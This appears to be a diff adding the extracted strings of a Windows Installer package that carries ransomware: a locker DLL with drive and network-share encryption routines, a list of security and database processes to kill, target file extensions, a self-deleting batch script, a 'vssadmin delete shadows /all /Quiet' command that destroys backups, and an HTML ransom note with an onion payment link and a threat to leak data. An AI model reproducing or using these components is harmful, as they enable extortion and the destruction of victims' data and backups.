@@ -1,0 +1,622 @@
+;;B&F7B
+B4FhD&B
+E(?(E8B
+:=A0A7>
+DrDhD7H
+@HND9C
+D1DhD7H
+ExE(;2D
+;;B&F7B
+B4FhD&B
+?dA/B6H
+@H??wElDj>
+@H??wElDj;
+fil797C4E0961B84F5C84A6DFE30F532316
+Installation Database
+fobici netiwosenu
+zoyopafe
+xolirame gadekegejo povefi
+Intel;1033
+{73A8AA6B-FD2A-4A30-9155-369F37E22849}
+Windows Installer XML Toolset (3.11.2.4516)
+am cannot be run in DOS mode.
+jCXj:f
+VVVVPVV
+QSUVW3
+QQSUVW
+_\_^][YY
+$SUj ]
+D$TVWPh
+!This program cannot be run in DOS mode.
+.rdata
+@.data
+.reloc
+l$43T$
+t@j*Xf
+Yj?Xj:f
+<pf;|t
+SSSSSSSS3
+tO9^<tJf9^8tDSSh
+tgUjD3
+expand 32-byte k
+SeTakeOwnershipPrivilege
+SeRestorePrivilege
+SeDebugPrivilege
+agntsvc
+bengine
+benetns
+beremote
+beserver
+dbeng50
+dbsnmp
+dfssvc
+EduLink2SIMS
+encsvc
+fdhost
+firefox
+infopath
+isqlplussvc
+msaccess
+mydesktopservice
+mydesktopqos
+ocautoupds
+onenote
+oracle
+outlook
+OWSTIMER
+postgres
+powerpnt
+pvlsvr
+SAVAdminService
+SavService
+sqbcoreservice
+sophos
+swc_service
+synctime
+tbirdconfig
+thebat
+thunderbird
+VxLockdownServer
+winword
+wordpad
+wsstracing
+WSSADMIN
+xfssvccon
+[I] Check double run... 
+BLOCKED
+[I] FINISHED
+[W] SKIP FOLDER RP(%0.8X): %ws
+[W] SKIP FOLDER BL: %ws
+[W] SKIP FILE RP(%0.8X): %ws
+[E] ERROR: malloc(LOCK_CONTEXT)=%u
+[E] ERROR: CreateThread=%u
+[W] SKIP VOLUME: %ws - READ ONLY
+[I] SCAN VOLUME: %ws
+================================
+        Lock local drive        
+================================
+       Lock network drive       
+      Lock network shares       
+[W] NOT SUPPORTED
+%CLIENT_ID%
+0123456789abcdef
+[E] ERROR: RSA(MasterKey)=%u
+attrib -s -r -h %1
+del /F /Q %1
+if exist %1 goto l
+del %0 
+--------- FILES ---------
+Total:
+Locked:
+--------- ERROR ---------
+Rename:
+------- SIZE STATS -------
+Total locked:
+%.3f GB
+------- SPEED STATS ------
+Crypt Avg:
+%0.3f MB/s
+Crypt Max:
+%0.3f MB/s
+Files:
+%0.3f files/s
+%0.0f sec
+locker_32.dll
+DllInstall
+DllRegisterServer
+GetVolumeInformationW
+FindFirstFileW
+HeapFree
+FindNextFileW
+lstrlenW
+FindClose
+GetLastError
+lstrcatW
+HeapAlloc
+LocalFree
+GetProcessHeap
+lstrcpyW
+WriteFile
+CreateFileW
+CloseHandle
+GetCurrentProcess
+TerminateProcess
+OpenProcess
+HeapReAlloc
+GetCurrentProcessId
+WideCharToMultiByte
+SetErrorMode
+CreateMutexW
+GetWindowsDirectoryW
+GetFileSizeEx
+UnmapViewOfFile
+GetTickCount64
+SetFilePointerEx
+CreateFileMappingW
+MapViewOfFile
+CreateThread
+lstrcmpiW
+MoveFileW
+GetDriveTypeW
+GetCommandLineW
+GetModuleFileNameW
+ExitProcess
+lstrlenA
+GetComputerNameA
+GetTempPathW
+CreateProcessW
+GetTickCount
+GetConsoleScreenBufferInfo
+GetStdHandle
+WriteConsoleA
+SetConsoleCursorPosition
+AllocConsole
+GetSystemDirectoryW
+KERNEL32.dll
+GetNamedSecurityInfoW
+SetNamedSecurityInfoW
+FreeSid
+AllocateAndInitializeSid
+SetEntriesInAclA
+OpenProcessToken
+LookupPrivilegeValueA
+AdjustTokenPrivileges
+CryptReleaseContext
+CryptImportKey
+CryptEncrypt
+CryptAcquireContextW
+CryptDestroyKey
+ADVAPI32.dll
+_vsnprintf
+_getch
+MSVCRT.dll
+StrStrIA
+StrCmpIW
+StrStrIW
+SHRegSetUSValueW
+SHLWAPI.dll
+ZwQuerySystemInformation
+ntdll.dll
+CharLowerW
+wsprintfW
+USER32.dll
+memcpy
+memset
+dd11ebd6225c2dd096733ff8dad28b643<html>
+<head>
+<title>RECOVERY MANUAL</title>
+</head>
+<body>
+<h1>Your ClientId:</h1>
+%CLIENT_ID%                                                     
+        
+  </pre>
+<hr/>                
+/!\ YOUR COMPANY' NETWORK HAS BEEN HACKED /!\ <br>
+All your important documents have been encrypted and transferred to our premises!</b><br>
+ANY ATTEMPT TO RESTORE YOUR FILES WITH THIRD-PARTY SOFTWARE WILL PERMANENTLY CORRUPT IT.<br>
+DO NOT MODIFY ENCRYPTED FILES.<br>
+DO NOT RENAME ENCRYPTED FILES.<br>
+However there is a solution for your problem!<br>
+We can support you with your data decryption for a monetary reward.<br>
+Also we will destroy your private data from our premises.<br>
+And we can prove our decryption capabilities by decrypting couple of your files free of charge.<br>
+Here are the next steps to get your valuable data back and get it wiped out from our premises:<br>
+<a href="http://qiludmxlqqotacf62iycexcohbka4ezresf5jmwdoh7iyk3tgguzaaqd.onion/?cid=%CLIENT_ID%                                                     ">http://qiludmxlqqotacf62iycexcohbka4ezresf5jmwdoh7iyk3tgguzaaqd.onion/?cid=%CLIENT_ID%                                                     </a><br>
+* Note that you need installed Tor Browser to open this kind of links.<br><br>
+Follow the instructions to install/run Tor Browser:<br>
+1. Go to TOR Project website https://www.torproject.org using your usual browser (Chrome, Firefox, Internet Explorer or Edge)<br>
+2. Click "Download Tor Browser" and pick right version for your Operation System (this is Windows in 99.9% of cases)<br>
+3. Download and Install Tor Browser<br>
+4. After installation finished, click on "Tor Browser" link from your Desktop<br>
+5. By using Tor Browser visit <a href="http://qiludmxlqqotacf62iycexcohbka4ezresf5jmwdoh7iyk3tgguzaaqd.onion/?cid=%CLIENT_ID%                                                     ">http://qiludmxlqqotacf62iycexcohbka4ezresf5jmwdoh7iyk3tgguzaaqd.onion/?cid=%CLIENT_ID%                                                     </a><br>
+6. Copy your client id from the top of this document and paste it into Authorization window if requested <br>
+7. This will start a chat with our security experts.<br>
+Please note, sometimes our team is away from keyboard, but make sure they will reply you back as soon as possible.<br>
+ Also, we kindly request you to contact with us as soon as possible.<br>
+ We will start publishing your private data to the Internet if you don't get in touch with us within next few days.<br>
+</body>
+</html>
+6V6[6b6
+747?7h7y7
+7*8B8K8
+8)929@9J9`9j9r9y9~9
+:&:K:V:v:|:
+:4;G;h;q;
+=&=2=7=B=J=k=p=
+0-0O0]0
+1a1t1|1
+3:3?3F3Z3h3m3
+4W4\4c4i4o4
+5%585?5F5V5]5w5~5
+6(6K6a6r6
+7%747F7T7i7t7
+73888?8^8
+90969N9T9^9s9
+:!:2:W:k:x:~:
+;1;I;R;f;s;~;
+=#=7=@=G=S=s=y=
+> >&>/>b>m>}>
+? ?%?3???K?S?^?r?~?
+080G0\0
+0 0$0(0,0004080<0@0D0H0L0P0T0X0\0`0d0h0l0p0t0x0|0
+6 6$6(6,6064686<6@6D6H6L6P6T6X6\6`6d6h6l6p6t6x6|6
+7 7$7(7,7074787<7@7D7H7L7P7T7X7\7`7d7h7l7p7t7x7|7
+8 8$8(8,8084888<8@8D8H8L8P8T8X8\8`8d8h8l8p8t8x8|8
+9 9$9(9,9094989<9@9D9H9L9P9T9X9\9`9d9h9l9p9t9x9|9
+: :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\:`:d:h:l:p:t:x:|:
+; ;$;(;,;0;4;8;<;@;D;H;L;P;T;X;\;`;d;h;l;p;t;x;|;
+< <$<(<,<0<4<8<<<@<D<H<L<P<T<X<\<`<d<h<l<p<t<x<|<
+= =$=(=,=0=8=<=@=D=H=L=P=T=X=\=`=d=h=l=p=t=x=|=
+> >$>(>,>0>4>8><>@>D>H>L>P>T>X>\>`>d>h>l>p>t>x>|>
+? ?$?(?,?0?4?8?<?@?D?H?L?P?T?X?\?`?d?h?l?p?t?x?|?
+0 0$0(0,0004080<0@0D0H0L0P0T0X0\0`0d0h0l0p0t0x0|0
+1 1$1(1,1014181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1|1
+2 2$2(2,2024282<2@2D2H2L2P2T2X2\2`2d2h2l2p2t2x2|2
+3 3$3(3,3034383<3@3D3H3L3P3T3X3\3`3d3h3l3p3t3x3|3
+4 4$4(4,4044484<4@4D4H4L4P4T4X4\4`4d4h4l4p4t4x4|4
+5 5$5(5,5054585<5@5D5H5L5P5T5X5\5`5d5h5l5p5t5x5|5
+6 6$6(6,6064686<6@6D6H6L6P6T6X6\6`6d6h6l6p6t6x6|6
+7 7$7(7,7074787<7@7D7H7L7P7T7X7\7`7d7h7l7p7t7x7|7
+8 8$8(8,8084888<8@8D8H8L8P8T8X8\8`8d8h8l8p8t8x8|8
+9 9$9(9,9094989<9@9D9H9L9P9T9X9`9d9p9t9x9|9
+: :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\:`:d:h:l:p:t:x:|:
+; ;$;(;,;0;4;8;<;@;D;H;L;P;T;X;\;`;d;h;l;p;t;x;|;
+< <$<(<,<0<4<8<<<@<D<H<L<P<T<X<\<h<l<p<t<x<|<
+= =$=(=,=0=4=8=<=@=D=H=L=P=T=X=\=`=d=h=l=p=t=x=|=
+> >$>(>,>0>4>8><>@>D>H>L>P>T>X>\>`>d>h>l>p>t>x>|>
+? ?$?(?,?0?4?8?<?@?D?H?L?P?T?X?\?`?d?h?l?p?t?x?|?
+0 0$0(0,080<0@0D0H0L0P0T0X0\0`0d0h0l0p0t0x0|0
+1 1$1(1,1014181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1|1
+2 2$2(2,2024282<2@2D2H2L2P2T2X2\2`2d2h2l2p2t2x2|2
+3 3$3(3,3034383<3@3D3H3L3P3T3X3\3`3d3h3l3p3t3x3|3
+4 4$4(4,4044484<4@4D4H4L4P4T4X4\4`4d4h4l4p4t4x4|4
+5 5$5(5,5054585<5@5D5H5L5P5T5X5\5`5d5h5l5p5t5x5|5
+6 6$6(6,6064686<6@6D6H6L6P6T6X6\6`6d6h6l6p6t6x6|6
+7 7$7(7,7074787<7@7D7H7L7P7T7X7\7`7d7h7l7p7t7x7|7
+8 8$8(8,8084888<8@8D8L8P8X8\8`8d8h8l8p8t8x8|8
+9 9$9(9,9094989<9@9D9H9L9P9T9X9\9`9d9h9l9p9t9x9|9
+: :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\:`:d:h:l:p:t:x:|:
+; ;(;0;4;8;<;@;D;H;L;P;T;X;\;`;d;h;l;p;t;x;|;
+< <$<(<,<0<4<8<<<@<D<H<L<P<T<X<\<`<d<h<l<p<t<x<|<
+= =$=(=,=0=4=8=<=@=D=H=L=P=T=X=\=`=d=h=l=p=t=x=|=
+> >$>(>,>0>4>8><>@>D>H>P>T>X>\>`>d>h>l>p>t>x>|>
+? ?$?(?,?0?4?8?<?@?D?H?L?P?T?X?\?`?d?h?l?p?t?x?|?
+0 0$0(0,00080<0@0D0H0L0P0T0X0\0`0d0h0l0p0t0x0|0
+1 1$1(1,1014181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1|1
+.If the expression syntax is invalid, the engine will terminate, returning iesBadActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress action.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrimary key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and language.Directory_DirectoryRequired key of a Directory table record. This is actually a property name whose value contains the actual path, set either by the AppSearch action or with the default setting obtained from the Directory table.AttributesRemote execution option, one of irsEnumA conditional statement that will disable this component if the specified condition evaluates to the 'True' state. If a component is disabled, it will not be installed, regardless of the 'Action' state associated with the component.KeyPathFile;Registry;ODBCDataSourceEither the p
+NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValueIdentifierName of tableName of columnY;NWhether the column is nullableYMinimum value allowedMaximum value allowedFor foreign key, Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;Language;Identifier;Binary;UpperCase;LowerCase;Filename;Paths;AnyPath;WildCardFilename;RegPath;CustomSource;Property;Cabinet;Shortcut;FormattedSDDLText;Integer;DoubleInteger;TimeDate;DefaultDirString categoryTextSet of values that are permittedDescription of columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression which skips the action if evaluates to expFalse.If the expression syntax is invalid, the engine will terminate, returning iesBadActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti
+Root Entry
+SummaryInformation
+""")))***++//////555=====MMMMSSSSSSSSbbfffffffftttuuuvvyyyyyy
+#%'#%'#%'
+-%/147:5IK
+47SUWZ\Qc'7Qfilnp#%'#%'
+$&($&($&(,.90368<HJL?>BEGOPNRY_aTVX[]edsrhgkmoq$&($&(xw
+")*+/5=MSbftuvy
+""")))***++//////555=====MMMMSSSSSSSSbbfffffffftttuuuvvyyyyyy
+Microsoft Enhanced Cryptographic Provider v1.0
+%0.8X%0.8X%0.8X%0.8X
+System Volume Information
+$RECYCLE.BIN
+Windows
+$WINDOWS.~BT
+Windows.old
+Program Files
+Program Files (x86)
+NVIDIA
+SYSTEM.SAV
+PerfLog
+microsoft
+RecoveryManual.html
+/scan:
+/marker:
+/nodel
+explorer.exe RecoveryManual.html
+Software\Classes\.%0.8X\shell\Open\command
+.ReadManual.%0.8X
+\%0.8X.bat
+"%s" "%s"
+d3dbsp
+darkness
+database
+dayzprofile
+db-journal
+db_journal
+debian
+default
+description
+design
+desklink
+directory
+dmtemplate
+docenx
+dochtml
+docmhtml
+docset
+docstates
+documentrevisions-v100
+docxml
+dothtml
+dotmenx
+dotxenx
+dwlibrary
+dxstudio
+acrobatsecuritysettings
+acrodata
+acroplugin
+acrypt
+afdesign
+age3rec
+age3sav
+age3scn
+age3xrec
+age3xsav
+age3xscn
+age3yrec
+age3ysav
+age3yscn
+approj
+arch00
+atomsvc
+automaticdestinations-ms
+backup
+backupdb
+bamboopaper
+bbprojectd
+bibtex
+bitstak
+bizdocument
+blend2
+breaking_bad
+burntheme
+camproj
+catdrawing
+catfct
+catpart
+catproduct
+cccrrrppp
+cerber
+cerber2
+cerber3
+cgfiletypetest
+chmprj
+chpscrap
+civ4worldbuildersave
+civbeyondswordsave
+cl2arc
+cl2doc
+clarify
+comicdoc
+comiclife
+compositionmodel
+compositiontemplate
+config
+contact
+converterx
+coverton
+crashed
+creole
+crjoker
+crptrgr
+crypted
+cryptolocker
+cryptowall
+cryptra
+current
+czvxce
+emlxpart
+enciphered
+encrypt
+encrypted
+enfpack
+enigma
+erbsql
+exprwdhtml
+exprwdxml
+fadein
+fantom
+feed-ms
+feedsdb-ms
+ffdata
+fountain
+fpdoclib
+fphomeop
+fplinkbar
+freepp
+fwtemplate
+groups
+gsheet
+gslides
+helpindex
+herbst
+hmskin
+htpasswd
+ibooks
+icalevent
+icaltodo
+incpas
+inprogress
+installhelper
+internetconnect
+jrprint
+kernel_complete
+kernel_pid
+kernel_time
+key-tef
+keybtc@inbox_com
+keynote
+kimcilware
+kraken
+kratos
+laccdb
+lastlogin
+layout
+lechiffre
+legion
+litemod
+lngttarch2
+localstorage
+locked
+logonxp
+mapimail
+markdn
+mcgame
+mcmeta
+mdbackup
+mdbhtml
+mdccache
+mddata
+mecontact
+mellel
+metadata_never_index
+mgourmet
+mgourmet3
+mhtenx
+mhtmlenx
+mindnode
+mission
+mlsxml
+moneywell
+mrwref
+ms-tnef
+mydocs
+narrative
+navmap
+nfs11save
+nmbtemplate
+nokogiri
+nrmlib
+number
+numbers
+odccubefile
+odcodc
+officeui
+p5tkjw
+padcrypt
+pages-tef
+paymrss
+paymst
+paymts
+payrms
+pbx5script
+pbxscript
+pdf_profile
+pdf_tsid
+pdfenx
+pdfxml
+pixexp
+pkpass
+plus_muhd
+poar2w
+pothtml
+ppsenx
+ppthtml
+pptmhtml
+pro4dvd
+pro5dvd
+pro5plx
+proofingtool
+prproj
+psafe3
+pse8db
+pspimage
+pubhtml
+pubmhtml
+qlgenerator
+rdoc_options
+recources
+resbuild
+result
+rgss3a
+rwlibrary
+safetext
+sas7bdat
+sc2save
+scrivx
+scspack
+sddraft
+sdmdocument
+search-ms
+secure
+securecrypted
+server
+sldasm
+sldprt
+sqlite
+sqlite3
+sqlitedb
+sqllite
+struct
+surprise
+switch
+syncdb
+tabula-doc
+tabula-docstyle
+tax2009
+tax2013
+tax2014
+template
+texinfo
+textclipping
+textile
+tmlanguage
+torrent
+totalslayout
+trashinfo
+txtrpt
+unity3d
+urd-journal
+vbadoc
+vcproj
+vcxproj
+venusf
+voprefs
+vpp_pc
+vspolicy
+vthought
+wallet
+wallet001
+webdoc
+webpart
+windows10
+wordlist
+wotreplay
+xcodeproj
+xlshtml
+xlsx3gp
+xlthtml
+xmt_bin
+xweb3htm
+xweb3html
+xweb4stm
+xweb4xml
+ycbcra
+zcrypt
+zip73i87a
+ztmp$efs
+zyklon
+\vssadmin.exe delete shadows /all /Quiet
+#%'#%'#%'
+-/147%:5IK#
+Z\47cQfQilnp7'#%'#%'%
